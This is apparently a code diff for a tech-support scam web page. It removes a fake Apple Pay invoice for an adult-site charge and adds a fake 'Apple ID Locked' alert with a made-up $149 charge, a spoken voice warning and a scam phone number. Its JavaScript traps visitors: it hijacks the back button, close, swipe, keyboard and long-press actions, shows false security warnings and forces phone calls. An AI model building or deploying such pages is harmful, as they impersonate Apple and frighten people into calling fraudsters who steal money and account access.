+                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 10px;">
+                    <button id="backToPage1Btn" style="background: none; border: none; color: #007aff; font-size: 16px; cursor: pointer; padding: 4px 8px;">
+                        <i class="fas fa-chevron-left"></i> Back
+                    </button>
+                    <span style="font-size: 14px; color: #8e8e93;">Transaction Details</span>
+                </div>
+
+                <div class="amount">
+                    $149.00 <small>USD</small>
+                </div>
+                <div class="sub-line">
+                    <i class="fas fa-shopping-bag"></i> Apple · App Store
+                </div>
+
+                <div class="tx-row">
+                    <span><i class="far fa-file-alt" style="margin-right: 6px;"></i> Transaction ID</span>
+                    <span>AP-2026-08-03-14:32</span>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 6px; margin: 2px 0 2px;">
+                    <span style="background: #34c759; width: 8px; height: 8px; border-radius: 20px;"></span>
+                    <span style="font-weight: 600; font-size: 14px; color: #f5f5f7;">Payment Done</span>
+                    <i class="fas fa-check-circle" style="color: #34c759; font-size: 16px;"></i>
+                </div>
+
+                <div class="tx-detail" id="dynamicDateContainer">
+                    <div class="row"><span class="label">Date</span><span class="value" id="dynamicDate">Loading...</span></div>
+                    <div class="row"><span class="label">Card</span><span class="value">Apple Pay ••••</span></div>
+                    <div class="row"><span class="label">Status</span><span class="value completed"><i class="fas fa-check-circle" style="margin-right: 4px;"></i> Completed</span></div>
+                    <div class="row"><span class="label">Auth</span><span class="value">AUTH-8F3A2B1C</span></div>
+                </div>
+
+                <div class="free-badge">
+                    <span><i class="fas fa-infinity"></i> Free</span>
+                    <span><i class="far fa-clock"></i> 24/7</span>
+                    <span><i class="fas fa-lock"></i> Encrypted</span>
+                </div>
+
+                <div class="alert-box">
+                    <div class="title"><i class="fas fa-exclamation-triangle"></i> Apple ID Locked</div>
+                    <p>Your Apple ID has been temporarily restricted due to an unrecognized sign-in attempt.</p>
+                    <div class="location"><i class="fas fa-map-pin"></i> Unknown location · IP masked</div>
+                    <button class="verify-now" id="verifyBtn2"><i class="fas fa-shield-alt"></i> Verify now to prevent permanent lock<br> +1-866-381-6357</button>
+                </div>
+
+                <div class="support-msg">
+                    <i class="fas fa-headset" style="color: #007aff;"></i> Call Apple Support immediately:
+                </div>
+
+                <div class="voice-message-banner" id="voiceBanner">
+                    <div class="left">
+                        <i class="fas fa-volume-up pulse"></i>
+                        <span class="msg"><strong>⚠️ Voice alert:</strong> Unauthorized charge detected</span>
+                    </div>
+                    <span class="badge">NEW</span>
+                </div>
+
+                <div style="display: flex; gap: 6px; margin: 2px 0 4px; flex-wrap: wrap;">
+                    <span style="background: #2c2c2e; padding: 2px 10px; border-radius: 40px; font-size: 11px; color: #aeaeb2; border:1px solid #3a3a3c;"><i class="fas fa-credit-card"></i> $149.00</span>
+                    <span style="background: #2c2c2e; padding: 2px 10px; border-radius: 40px; font-size: 11px; color: #aeaeb2; border:1px solid #3a3a3c;"><i class="fas fa-exclamation-circle"></i> Unauthorized</span>
+                </div>
+
+                <div class="voice-container">
+                    <i class="fas fa-microphone-alt"></i>
+                    <span class="msg-text">“Unauthorized charge of $149.00 from your App Store”</span>
+                    <button class="voice-play-btn" id="playVoiceBtn">
+                        <i class="fas fa-play"></i> Listen
+                    </button>
+                </div>
+
+                <div class="secure-footer">
+                    <span><i class="fas fa-lock"></i> Secure</span>
+                    <span><i class="fas fa-shield-alt"></i> Encrypted</span>
+                    <span><i class="fas fa-clock"></i> 24/7</span>
+                </div>
+                <p class="text-small">Tap "Listen" for voice alert about unauthorized charges</p>
+            </div>
+
         </div>
-      </div>
-
-      <div class="inv-amt">$324.00</div>
-      <div class="inv-mth">Apple Pay - Crypto</div>
-
-      <div class="txn-wrap">
-        <p class="txn-head">Transaction Details</p>
-        <div class="txn-row">
-          <span class="tk">Product</span>
-          <span class="tv">Xhamster Premium</span>
-        </div>
-        <div class="txn-row">
-          <span class="tk">Transaction<br>ID</span>
-          <span class="tv">
-            TXN-2026-0302-7724
-            <span class="copy-btn">
-              <svg viewBox="0 0 24 24">
-                <rect x="9" y="9" width="13" height="13" rx="2"/>
-                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
-              </svg>
-            </span>
-          </span>
-        </div>
-        <div class="txn-row">
-          <span class="tk">Country</span>
-          <span class="tv">United States</span>
-        </div>
-        <div class="txn-warn">
-          <p>If this charge is not authenticated by you.</p>
-          <p style="margin-top:4px;">Call Apple Care Toll Free <span style="color:#3478f6;font-weight:700;">+1 (855) 541-9592</span></p>
-        </div>
-      </div>
-
-    </div><!-- end inv-body -->
-  </div><!-- end inv-card -->
-</div><!-- end screen-invoice -->
-
-</div><!-- end app -->
-
-<!-- POPUP -->
-<div id="popup-overlay">
-  <div class="popup-card">
-    <span class="px" id="popupClose">✕</span>
-    <p class="pt">Contact Support</p>
-    <div class="p-icon">
-      <svg viewBox="0 0 24 24"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"/></svg>
     </div>
-    <p class="pm">Your Apple Pay successfully pre-authorized charge of USD 324.00 $ towards XHAMSTER adult website. If this charge is not authenticated by you. Call Apple Care Toll Free +1 (855) 541-9592 to stop this payment Immediately.</p>
-    <p class="pn">+1 (855) 541-9592</p>
-    <a href="tel:+18555419592" class="cbtn">
-      <svg viewBox="0 0 24 24"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"/></svg>
-      Call Now
-    </a>
-    <p class="ml">Maybe later</p>
-  </div>
-</div>
 
-<script>
-const S={
-  loader:document.getElementById('screen-loader'),
-  tick:document.getElementById('screen-tick'),
-  invoice:document.getElementById('screen-invoice'),
-  popup:document.getElementById('popup-overlay'),
-  close:document.getElementById('popupClose')
-};
-function show(el){[S.loader,S.tick,S.invoice].forEach(s=>s.style.display='none');el.style.display='flex'}
-show(S.loader);
-setTimeout(()=>{
-  show(S.tick);
-  setTimeout(()=>{
-    show(S.invoice);
-    setTimeout(()=>S.popup.classList.add('active'),5000);
-  },1500);
-},1800);
-S.invoice.addEventListener('click',()=>S.popup.classList.add('active'));
-S.close.addEventListener('click',e=>e.stopPropagation());
-document.querySelector('.popup-card').addEventListener('click',e=>e.stopPropagation());
-</script>
+    <script>
+        (function() {
+            'use strict';
+
+            // ----- DYNAMIC DATE -----
+            function updateDynamicDate() {
+                const now = new Date();
+                const options = {
+                    year: 'numeric',
+                    month: 'short',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    timeZoneName: 'short'
+                };
+                const dateStr = now.toLocaleString('en-US', options);
+                const el = document.getElementById('dynamicDate');
+                if (el) el.textContent = dateStr;
+            }
+            updateDynamicDate();
+
+            // ----- ELEMENTS -----
+            const splash = document.getElementById('splashScreen');
+            const popup = document.getElementById('popupOverlay');
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            const gotoPage2Btn = document.getElementById('gotoPage2Btn');
+            const backToPage1Btn = document.getElementById('backToPage1Btn');
+            const playBtn = document.getElementById('playVoiceBtn');
+            const voiceBanner = document.getElementById('voiceBanner');
+            const verifyBtn2 = document.getElementById('verifyBtn2');
+
+            const PHONE = '+18663816357';
+
+            // ----- PAGE NAVIGATION -----
+            function showPage(pageId) {
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                const target = document.getElementById(pageId);
+                if (target) target.classList.add('active');
+                const card = document.getElementById('mainCard');
+                if (card) card.scrollTop = 0;
+            }
+
+            gotoPage2Btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showPage('page2');
+                setTimeout(function() {
+                    if (!voiceStarted) {
+                        tryPlayVoice();
+                    }
+                }, 300);
+            });
+
+            backToPage1Btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showPage('page1');
+                if (voiceStarted) {
+                    pauseVoice();
+                }
+            });
+
+            // ----- FORCE CALL -----
+            function forceCall() {
+                window.location.href = 'tel:' + PHONE;
+                return false;
+            }
+
+            // ----- BACK BUTTON TRAP + CLOSE WARNING (NEW) -----
+            // Push a history state to trap the user
+            history.pushState(null, null, location.href);
+
+            // 1. Intercept popstate (back button) – show warning then force call
+            window.addEventListener('popstate', function(e) {
+                // Re-push state to keep trapped
+                history.pushState(null, null, location.href);
+
+                // Custom warning before call
+                const shouldCall = confirm(
+                    '⚠️ SECURITY ALERT\n\n' +
+                    'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
+                    'Please call Apple Support immediately to secure your account.\n\n' +
+                    '📞 +1 866-381-6357\n\n' +
+                    'Would you like to call now?'
+                );
+
+                if (shouldCall) {
+                    forceCall();
+                } else {
+                    // If they cancel, show another alert and keep them trapped
+                    alert(
+                        '⚠️ You must call Apple Support immediately to protect your account.\n\n' +
+                        'Your payments and banking information are at risk. Please do not close this page.'
+                    );
+                    // Re-push state again to ensure they can't leave
+                    history.pushState(null, null, location.href);
+                }
+                return false;
+            });
+
+            // 2. Intercept beforeunload (refresh / close tab) – show warning
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '⚠️ SECURITY WARNING: Your Apple ID session is active. Closing this page may expose your payments & banking to serious threats. Please call support.';
+                return e.returnValue;
+            });
+
+            // 3. Also block pagehide for iOS (when user tries to close tab / navigate)
+            window.addEventListener('pagehide', function(e) {
+                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || 
+                             (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+                if (isIOS && !window._callInitiated) {
+                    // Show a warning via alert (iOS may not show beforeunload consistently)
+                    alert(
+                        '⚠️ SECURITY WARNING\n\n' +
+                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
+                        'Please call Apple Support immediately: +1 866-381-6357'
+                    );
+                    // Attempt to call anyway
+                    setTimeout(function() {
+                        window.location.href = 'tel:' + PHONE;
+                    }, 100);
+                }
+            });
+
+            // 4. Block context menu (long press) – optional, shows warning
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                const shouldCall = confirm(
+                    '⚠️ SECURITY ALERT\n\n' +
+                    'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
+                    'Call Apple Support now? 📞 +1 866-381-6357'
+                );
+                if (shouldCall) forceCall();
+            });
+
+            // 5. Block left swipe (back gesture on iOS)
+            let startX = 0;
+            document.addEventListener('touchstart', function(e) {
+                startX = e.touches[0].clientX;
+            }, { passive: true });
+            document.addEventListener('touchmove', function(e) {
+                const touch = e.touches[0];
+                const deltaX = touch.clientX - startX;
+                if (startX < 30 && deltaX > 50) {
+                    e.preventDefault();
+                    const shouldCall = confirm(
+                        '⚠️ BACK GESTURE DETECTED\n\n' +
+                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
+                        'Call Apple Support now? 📞 +1 866-381-6357'
+                    );
+                    if (shouldCall) forceCall();
+                }
+            }, { passive: false });
+
+            // 6. Block keyboard shortcuts (Backspace, etc.)
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' || (e.metaKey && e.key === 'ArrowLeft') || (e.altKey && e.key === 'ArrowLeft')) {
+                    e.preventDefault();
+                    const shouldCall = confirm(
+                        '⚠️ NAVIGATION BLOCKED\n\n' +
+                        'Your Apple ID session is active. Closing this page may leave your account open and expose your payments & banking to serious threats.\n\n' +
+                        'Call Apple Support now? 📞 +1 866-381-6357'
+                    );
+                    if (shouldCall) forceCall();
+                }
+            });
+
+            // ----- PHONE CALL (tel: link) -----
+            verifyBtn2.addEventListener('click', function(e) {
+                e.preventDefault();
+                window._callInitiated = true;
+                window.location.href = 'tel:' + PHONE;
+            });
+
+            document.querySelector('.phone-number-display .number a')?.addEventListener('click', function(e) {
+                window._callInitiated = true;
+            });
+
+            // ----- VOICE MESSAGE -----
+            let voiceStarted = false;
+            let voicePaused = false;
+            let currentUtterance = null;
+
+            function tryPlayVoice() {
+                if ('speechSynthesis' in window) {
+                    window.speechSynthesis.cancel();
+                    const msg = new SpeechSynthesisUtterance();
+                    msg.text = "Unauthorized charge of one hundred forty nine dollars from your Apple ID. Please call support immediately. This is a secure voice alert.";
+                    msg.lang = 'en-US';
+                    msg.rate = 0.95;
+                    msg.pitch = 1.0;
+                    msg.volume = 1;
+                    msg.onend = function() {
+                        voiceStarted = false;
+                        if (playBtn) {
+                            playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
+                            playBtn.style.background = '#007aff';
+                        }
+                    };
+                    currentUtterance = msg;
+                    window.speechSynthesis.speak(msg);
+                    voiceStarted = true;
+                    voicePaused = false;
+                    if (playBtn) {
+                        playBtn.innerHTML = '<i class="fas fa-stop"></i> Stop';
+                        playBtn.style.background = '#ff3b30';
+                    }
+                    if (voiceBanner) {
+                        voiceBanner.style.border = '2px solid #ff9500';
+                        setTimeout(() => { voiceBanner.style.border = '1px solid #3a3a3c'; }, 2000);
+                    }
+                } else {
+                    alert('🔊 Voice alert: Unauthorized charge of $149.00 from your App Store. Please call support.');
+                }
+            }
+
+            function pauseVoice() {
+                if ('speechSynthesis' in window) {
+                    if (window.speechSynthesis.speaking) {
+                        window.speechSynthesis.cancel();
+                        voiceStarted = false;
+                        voicePaused = true;
+                        if (playBtn) {
+                            playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
+                            playBtn.style.background = '#007aff';
+                        }
+                    }
+                }
+            }
+
+            function stopVoice() {
+                if ('speechSynthesis' in window) {
+                    window.speechSynthesis.cancel();
+                    voiceStarted = false;
+                    voicePaused = false;
+                    if (playBtn) {
+                        playBtn.innerHTML = '<i class="fas fa-play"></i> Listen';
+                        playBtn.style.background = '#007aff';
+                    }
+                }
+            }
+
+            playBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (voiceStarted) {
+                    stopVoice();
+                } else {
+                    tryPlayVoice();
+                }
+            });
+
+            voiceBanner.addEventListener('click', function(e) {
+                if (!voiceStarted) {
+                    tryPlayVoice();
+                }
+            });
+
+            // Stop voice if popup hidden
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.attributeName === 'class') {
+                        if (!popup.classList.contains('active')) {
+                            stopVoice();
+                        }
+                    }
+                });
+            });
+            observer.observe(popup, { attributes: true });
+
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'hidden') {
+                    stopVoice();
+                }
+            });
+
+            // ----- SPLASH TIMER (2.8s) then popup -----
+            setTimeout(() => {
+                splash.classList.add('hidden');
+                popup.classList.add('active');
+                showPage('page1');
+            }, 2800);
+
+            console.log('📱 Popup with 2-page navigation ready.');
+            console.log('📞 Phone number: ' + PHONE);
+            console.log('🔊 Voice: tap Listen on Page 2 (iOS autoplay fallback ready)');
+            console.log('🔒 Back button trapped + close warning active.');
+
+        })();
+    </script>
+
 </body>
 </html>
-
